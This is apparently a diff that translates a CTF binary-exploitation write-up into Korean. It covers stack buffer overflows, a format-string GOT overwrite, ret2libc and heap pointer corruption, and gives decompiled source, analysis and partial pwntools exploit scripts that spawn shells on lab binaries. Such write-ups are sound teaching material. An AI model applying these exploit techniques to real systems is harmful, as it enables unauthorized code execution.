@@ -15,7 +15,7 @@ authors:
 
 ## Basic BOF #1
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -25,7 +25,7 @@ NX:       NX enabled
 PIE:      No PIE (0x8048000)
 ```
 
-### Source
+### 소스
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -48,11 +48,11 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-### Analysis
+### 분석
 
-The buffer `s` is 40 bytes. `v5` sits at `ebp-0xC`, which is 40 bytes above the start of `s` (`ebp-0x34`). Overflowing `s` by exactly 40 bytes reaches `v5` and overwrites it with `0xDEADBEEF` to get a shell.
+버퍼 `s`는 40바이트다. `v5`는 `ebp-0xC`에 위치하는데, 이는 `s`의 시작(`ebp-0x34`)보다 40바이트 위다. `s`를 정확히 40바이트 오버플로우하면 `v5`에 도달하여 `0xDEADBEEF`로 덮어쓸 수 있고, 셸을 얻는다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -74,7 +74,7 @@ uid=1000(attack) gid=1000(attack) groups=1000(attack)
 
 ## Basic BOF #2
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -84,7 +84,7 @@ NX:       NX enabled
 PIE:      No PIE (0x8048000)
 ```
 
-### Source
+### 소스
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -99,17 +99,17 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-### Analysis
+### 분석
 
-`v5` is a function pointer initialized to `sup` (a benign function). It sits at `ebp-0xC`, which is `0x80` = 128 bytes above the buffer start (`ebp-0x8C`). The buffer is 80 bytes; the gap between the end of `s` and `v5` is `128 - 80 = 48` bytes.
+`v5`는 `sup`(무해한 함수)으로 초기화된 함수 포인터다. `ebp-0xC`에 위치하는데, 이는 버퍼 시작(`ebp-0x8C`)보다 `0x80` = 128바이트 위다. 버퍼는 80바이트이고, `s`의 끝과 `v5` 사이의 간격은 `128 - 80 = 48`바이트다.
 
-Overflowing 80 + 48 = 128 bytes and then writing the address of the shell-spawning function redirects the call through `v5()`.
+80 + 48 = 128바이트를 오버플로우하고 셸을 실행하는 함수의 주소를 쓰면 `v5()` 호출이 해당 함수로 리다이렉트된다.
 
 ```
-shell = 0x804849b  # address of the win function
+shell = 0x804849b  # win 함수의 주소
 ```
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -132,7 +132,7 @@ uid=1000(attack) gid=1000(attack) groups=1000(attack)
 
 ## Basic FSB
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -143,7 +143,7 @@ PIE:      No PIE (0x8048000)
 RWX:      Has RWX segments
 ```
 
-### Source
+### 소스
 
 ```c
 int flag()
@@ -164,19 +164,19 @@ int vuln()
 }
 ```
 
-### Analysis
+### 분석
 
-The user input in `s` is copied into `format` via `snprintf`, then passed directly to `printf`. This is a classic format string vulnerability — the attacker controls the format string and can write arbitrary values to arbitrary addresses.
+사용자 입력 `s`가 `snprintf`로 `format`에 복사된 뒤, 그대로 `printf`에 전달된다. 이것은 전형적인 포맷 스트링 취약점이다 — 공격자가 포맷 스트링을 제어하므로 임의의 주소에 임의의 값을 쓸 수 있다.
 
-The goal is to overwrite `printf`'s GOT entry with the address of `flag()`, so the next call to `printf` executes a shell instead.
+목표는 `printf`의 GOT 엔트리를 `flag()`의 주소로 덮어쓰는 것이다. 그러면 다음 `printf` 호출이 셸 대신 실행된다.
 
 - `printf` GOT: `e.got['printf']`
-- `flag` address: `0x80485b4`
-- Format string offset: `2` (determined by probing with `%1$x`, `%2$x`, ...)
+- `flag` 주소: `0x80485b4`
+- 포맷 스트링 오프셋: `2` (`%1$x`, `%2$x`, ...로 탐색하여 결정)
 
-pwntools' `fmtstr_payload` automates constructing the write-what-where payload.
+pwntools의 `fmtstr_payload`가 write-what-where 페이로드 구성을 자동화한다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -202,7 +202,7 @@ uid=1000(attack) gid=1000(attack) groups=1000(attack)
 
 ## x64 Buffer Overflow
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     amd64-64-little
@@ -212,7 +212,7 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-### Source
+### 소스
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -227,20 +227,18 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-### Analysis
+### 분석
 
-The buffer is `0x110` = 272 bytes, but `rbp-0x110` with an 8-byte saved RBP means the return address is at offset 272 + 8 = 280 bytes from `s`. `scanf("%s")` has no length limit, enabling a straightforward ROP-based overflow.
+버퍼는 `0x110` = 272바이트지만, `rbp-0x110`에 8바이트 저장된 RBP가 있으므로 리턴 주소는 `s`에서 272 + 8 = 280바이트 오프셋에 있다. `scanf("%s")`는 길이 제한이 없으므로 곧바로 ROP 기반 오버플로우가 가능하다.
 
-Since there is no canary and no PIE, a hidden `callMeMaybe` function at `0x400606` can be called directly. Because this is x86-64, the first argument goes in `rdi`; a `pop rdi; ret` gadget at `0x400713` is used to set up arguments if needed.
-
-In the simplest case — where `callMeMaybe` takes no arguments — the payload is just the offset padding followed by the function address:
+카나리도 없고 PIE도 없으므로, `0x400606`에 있는 숨겨진 `callMeMaybe` 함수를 직접 호출할 수 있다. x86-64이므로 첫 번째 인자는 `rdi`에 들어가야 하지만, 인자가 필요 없는 가장 단순한 경우에는 오프셋 패딩 뒤에 함수 주소만 있으면 된다:
 
 ```
 offset = 280
 payload = "A" * 280 + p64(callMeMaybe)
 ```
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -265,7 +263,7 @@ uid=1000(attack) gid=1000(attack) groups=1000(attack)
 
 ## beginner_heap
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     amd64-64-little
@@ -273,7 +271,7 @@ NX:       NX enabled
 Stack canary present
 ```
 
-### Source
+### 소스
 
 ```c
 void __fastcall __noreturn main(int a1, char **a2, char **a3)
@@ -284,14 +282,14 @@ void __fastcall __noreturn main(int a1, char **a2, char **a3)
 
   v3 = malloc(16);
   *v3 = 1;
-  *(v3 + 1) = malloc(8);   // inner buffer for v3
+  *(v3 + 1) = malloc(8);   // v3의 내부 버퍼
 
   v4 = malloc(16);
   *v4 = 2;
-  *(v4 + 1) = malloc(8);   // inner buffer for v4
+  *(v4 + 1) = malloc(8);   // v4의 내부 버퍼
 
   fgets(s, 4096, stdin);
-  strcpy(*(v3 + 1), s);    // unchecked copy into 8-byte buffer
+  strcpy(*(v3 + 1), s);    // 8바이트 버퍼로 무검사 복사
 
   fgets(s, 4096, stdin);
   strcpy(*(v4 + 1), s);
@@ -300,21 +298,21 @@ void __fastcall __noreturn main(int a1, char **a2, char **a3)
 }
 ```
 
-### Analysis
+### 분석
 
-Each "node" is a 16-byte heap chunk: the first 8 bytes hold an integer ID, and the next 8 bytes hold a pointer to an 8-byte inner buffer. The first `strcpy` copies up to 4096 bytes into the 8-byte inner buffer of `v3`, overflowing onto the heap.
+각 "노드"는 16바이트 힙 청크다: 처음 8바이트는 정수 ID를, 다음 8바이트는 8바이트 내부 버퍼에 대한 포인터를 담는다. 첫 번째 `strcpy`는 최대 4096바이트를 `v3`의 8바이트 내부 버퍼로 복사하여 힙 위로 오버플로우한다.
 
-Because `v3`'s inner buffer (8 bytes) is immediately followed by `v4`'s 16-byte chunk, the overflow can overwrite `v4`'s fields — in particular, the pointer at `*(v4 + 1)`. The second `strcpy` then writes into whatever address `*(v4 + 1)` now points to, giving a write-what-where primitive.
+`v3`의 내부 버퍼(8바이트) 바로 다음에 `v4`의 16바이트 청크가 있으므로, 오버플로우로 `v4`의 필드 — 특히 `*(v4 + 1)`의 포인터 — 를 덮어쓸 수 있다. 두 번째 `strcpy`는 `*(v4 + 1)`이 이제 가리키는 주소에 쓰게 되어 write-what-where 프리미티브가 생긴다.
 
-The target is `get_flag` — a function that reads and prints `flag`. By directing the second write to overwrite a function pointer (or a GOT entry reachable through `exit`), `get_flag` executes.
+목표는 `get_flag` — 플래그를 읽고 출력하는 함수다. 두 번째 쓰기가 함수 포인터(또는 `exit`를 통해 접근할 수 있는 GOT 엔트리)를 덮어쓰도록 유도하면 `get_flag`가 실행된다.
 
-The tcache allocator in glibc ≥ 2.26 means freed chunks of the same size are recycled immediately, and the layout is deterministic for this simple case.
+glibc ≥ 2.26의 tcache 할당자는 동일 크기의 해제된 청크를 즉시 재활용하므로, 이 단순한 경우에서 레이아웃은 결정론적이다.
 
 ---
 
 ## RTL_core
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -324,7 +322,7 @@ NX:       NX enabled
 PIE:      No PIE (0x8048000)
 ```
 
-### Source
+### 소스
 
 ```c
 int __cdecl check_passcode(int a1)
@@ -340,24 +338,24 @@ ssize_t core()
   int buf;
   // ...
   void *v4 = dlsym((void *)0xFFFFFFFF, "printf");
-  printf(&format, v4);          // leaks printf address
+  printf(&format, v4);          // printf 주소를 누출
   return read(0, &buf, 0x64u);  // BOF
 }
 
 int main(int argc, const char **argv, const char **envp)
 {
   char s[24];
-  gets(s);                                  // unchecked read
+  gets(s);                                  // 무검사 읽기
   if ( check_passcode((int)s) == hashcode ) // hashcode = 3235492007
     core();
 }
 ```
 
-### Stage 1 — Passcode bypass
+### Stage 1 — 패스코드 우회
 
-`check_passcode` sums five consecutive 32-bit integers starting at the input buffer and compares to `hashcode = 3235492007 (0xC0DEC0DE... wait: 0xC0DEB33F)`.
+`check_passcode`는 입력 버퍼에서 시작하는 연속된 32비트 정수 다섯 개를 더하여 `hashcode = 3235492007`과 비교한다.
 
-`3235492007 / 5 = 647098401` with remainder `2`. So four equal values plus one that is 2 larger satisfies the sum:
+`3235492007 / 5 = 647098401` 나머지 `2`. 따라서 같은 값 네 개에 2가 더 큰 값 하나를 더하면 합이 맞는다:
 
 ```
 data = 0x2691f021  # 647098401
@@ -366,15 +364,15 @@ payload = p32(data) * 4 + p32(data + 2)
 
 ### Stage 2 — ret2libc
 
-After passing the check, `core()` leaks `printf`'s runtime address via `dlsym`, then reads 100 bytes into a 62-byte buffer (`buf` at `ebp-0x3E`), giving a 38-byte overflow past the saved EIP.
+패스코드 검사를 통과하면 `core()`는 `dlsym`을 통해 `printf`의 런타임 주소를 누출한 뒤, 62바이트 버퍼(`buf`는 `ebp-0x3E`)로 100바이트를 읽어 38바이트 오버플로우를 허용한다.
 
-Using the leaked `printf` address, compute libc base and derive `system` and `/bin/sh` offsets. The return-to-libc chain:
+누출된 `printf` 주소를 사용해 libc 베이스를 계산하고 `system`과 `/bin/sh` 오프셋을 구한다. return-to-libc 체인:
 
 ```
-[padding 66B] [system] [AAAA] [/bin/sh]
+[패딩 66B] [system] [AAAA] [/bin/sh]
 ```
 
-### Full Exploit
+### 전체 익스플로잇
 
 ```python
 from pwn import *
@@ -389,7 +387,7 @@ payload = p32(data) * 4 + p32(data + 2)
 p.recvuntil("Passcode: ")
 p.sendline(payload)
 
-# Leak printf
+# printf 누출
 p.recvuntil("0x")
 printf = int(p.recv(8), 16)
 print("printf addr:", hex(printf))
@@ -416,7 +414,7 @@ uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
 
 ## gift
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -426,7 +424,7 @@ NX:       NX enabled
 PIE:      No PIE (0x8048000)
 ```
 
-### Source
+### 소스
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -435,23 +433,23 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
   printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
   fgets(s, 128, stdin);
-  printf(s);   // format string vulnerability (unused here)
-  gets(s);     // unconstrained read — BOF
+  printf(s);   // 포맷 스트링 취약점 (여기서는 미사용)
+  gets(s);     // 무제한 읽기 — BOF
   return 0;
 }
 ```
 
-### Analysis
+### 분석
 
-The binary hands out two addresses: `&binsh` (a writable global that can hold the `/bin/sh` string) and `&system` (a pointer to `system()`). The trick is that `&binsh` is not a pointer to the string — it is the **buffer** where `/bin/sh` must be written first.
+바이너리가 두 주소를 먼저 알려준다: `&binsh`(`/bin/sh` 문자열이 들어갈 쓰기 가능한 전역 버퍼)와 `&system`(`system()`에 대한 포인터). 주의할 점은 `&binsh`가 문자열 자체를 가리키는 포인터가 아니라 — `/bin/sh`를 먼저 써야 하는 **버퍼** 자체라는 것이다.
 
-The two-stage exploit:
-1. Use `gets@plt` to write `/bin/sh\x00` into the `binsh` buffer (gadget: `pop ret` cleans the argument).
-2. Call `system(binsh)` via RTL.
+두 단계 익스플로잇:
+1. `gets@plt`를 사용해 `binsh` 버퍼에 `/bin/sh\x00`을 쓴다 (가젯: `pop ret`으로 인자를 정리한다).
+2. `system(binsh)`을 RTL로 호출한다.
 
-The overflow offset from `s` to the saved EIP is `128 + 4 (saved EBP) = 136` bytes.
+`s`에서 저장된 EIP까지의 오버플로우 오프셋은 `128 + 4(저장된 EBP) = 136`바이트다.
 
-### Exploit
+### 익스플로잇
 
 ```python
 from pwn import *
@@ -468,10 +466,10 @@ system = int(data[1], 16)
 popret    = 0x080483ad
 gets_plt  = e.plt['gets']
 
-# Discard fgets input (format string stage)
+# fgets 입력 처리 (포맷 스트링 단계)
 p.sendline(b"A" * 4)
 
-# BOF via gets: call gets(binsh) then system(binsh)
+# gets를 통한 BOF: gets(binsh)를 호출한 뒤 system(binsh)를 호출
 payload  = b"A" * 136
 payload += p32(gets_plt)
 payload += p32(popret)
@@ -494,7 +492,7 @@ uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
 
 ## fengshui
 
-### Binary Info
+### 바이너리 정보
 
 ```
 Arch:     i386-32-little
@@ -504,29 +502,29 @@ NX:       NX enabled
 PIE:      No PIE (0x8048000)
 ```
 
-### Source Overview
+### 소스 개요
 
-A heap management challenge with four operations: Add, Delete, Display, and Update.
+Add, Delete, Display, Update 네 가지 연산을 가진 힙 관리 문제다.
 
 ```c
-// add_location: allocates a variable-size description buffer + a fixed 0x80 metadata chunk
+// add_location: 가변 크기 설명 버퍼 + 고정 0x80 메타데이터 청크 할당
 _DWORD *__cdecl add_location(size_t a1)
 {
-  void *s  = malloc(a1);      // description buffer (user-controlled size)
-  _DWORD *v3 = malloc(0x80);  // metadata chunk
-  *v3 = s;                    // v3[0] = pointer to description
-  // v3[4..] = name (up to 124 bytes)
+  void *s  = malloc(a1);      // 설명 버퍼 (사용자 제어 크기)
+  _DWORD *v3 = malloc(0x80);  // 메타데이터 청크
+  *v3 = s;                    // v3[0] = 설명 포인터
+  // v3[4..] = 이름 (최대 124바이트)
   *(&store + cnt) = v3;
   update_desc(cnt++);
   return v3;
 }
 
-// update_desc: bounds-checked write into the description buffer
+// update_desc: 설명 버퍼로의 경계 검사 쓰기
 unsigned int __cdecl update_desc(unsigned __int8 a1)
 {
   int v3 = 0;
   scanf("%u%c", &v3, &v2);
-  // guard: rejects writes that would reach the metadata chunk
+  // 보호: 메타데이터 청크에 닿는 쓰기를 거부
   if ( (char *)(v3 + *v3_desc_ptr) >= (char *)metadata_ptr - 4 )
   {
     puts("Nah...");
@@ -536,10 +534,10 @@ unsigned int __cdecl update_desc(unsigned __int8 a1)
 }
 ```
 
-### Vulnerability
+### 취약점
 
-The `update_desc` bounds check compares the end of the requested write against the metadata pointer minus 4. With careful heap layout, allocating chunks of specific sizes causes the freed description buffer from one location to be recycled as the metadata chunk for a subsequent allocation (tcache / fastbin reuse). This lets the description write overwrite the `*v3` field (the description pointer) of another location.
+`update_desc`의 경계 검사는 요청된 쓰기의 끝을 메타데이터 포인터 마이너스 4와 비교한다. 특정 크기의 청크를 신중하게 할당하면 한 위치에서 해제된 설명 버퍼가 다음 할당의 메타데이터 청크로 재활용된다(tcache/fastbin 재사용). 이를 통해 설명 쓰기가 다른 위치의 `*v3` 필드(설명 포인터)를 덮어쓸 수 있다.
 
-Once the pointer is corrupted, a `display_location` call leaks a heap or libc address, and a subsequent `update_desc` writes to an arbitrary address — enabling a GOT overwrite or similar technique to redirect execution to a shell.
+포인터가 손상되면 `display_location` 호출이 힙이나 libc 주소를 누출하고, 후속 `update_desc`가 임의의 주소에 쓸 수 있게 된다 — GOT 덮어쓰기나 유사한 기법으로 셸로 실행 흐름을 바꿀 수 있다.
 
-The exact payload depends on the libc version and heap layout at runtime; the general primitive is: **heap overflow → pointer corruption → arbitrary write → GOT overwrite → shell**.
+정확한 페이로드는 libc 버전과 런타임 힙 레이아웃에 따라 다르며, 일반적인 프리미티브는 다음과 같다: **힙 오버플로우 → 포인터 손상 → 임의 쓰기 → GOT 덮어쓰기 → 셸**.
